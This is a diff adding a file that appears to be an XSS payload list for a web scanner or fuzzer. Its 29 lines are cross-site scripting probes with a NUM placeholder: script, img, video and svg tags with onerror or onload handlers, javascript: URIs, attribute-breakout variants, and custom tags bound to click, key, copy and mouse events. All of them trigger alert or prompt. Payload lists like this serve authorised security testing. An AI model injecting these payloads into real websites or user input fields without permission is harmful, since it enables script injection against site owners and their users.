@@ -1,0 +1,29 @@
+TestPayload(NUM)
+TestPayload(NUM)
+javascript:alert(NUM)
+alert(/NUM/.source)
+' onload="alert(String.fromCharCode(NUM))"
+' onmouseover='alert(/NUM/.source)'
+<video src=x onerror=alert(NUM);>
+"><video src=x onerror=alert(NUM);>
+<img src=x onerror='alert(NUM)'>
+"><img src=x onerror='alert(NUM)'>
+<script>alert(NUM)</script>
+"><script>alert(NUM)</script>
+<svg/OnlOad=prompt(NUM)>
+"><svg/OnlOad=prompt(NUM)>
+<brute contenteditable onblur=alert(NUM)>lose focus!
+<brute onclick=alert(NUM)>click this!
+<brute oncopy=alert(NUM)>copy this!
+<brute oncontextmenu=alert(NUM)>right click this!
+<brute oncut=alert(NUM)>copy this!
+<brute ondblclick=alert(NUM)>double click this!
+<brute ondrag=alert(NUM)>drag this!
+<brute contenteditable onfocus=alert(NUM)>focus this!
+<brute contenteditable oninput=alert(NUM)>input here!
+<brute contenteditable onkeydown=alert(NUM)>press any key!
+<brute contenteditable onkeypress=alert(NUM)>press any key!
+<brute contenteditable onkeyup=alert(NUM)>press any key!
+<brute onmousedown=alert(NUM)>click this!
+<brute onmousemove=alert(NUM)>hover this!
+<brute onmouseout=alert(NUM)>hover this!
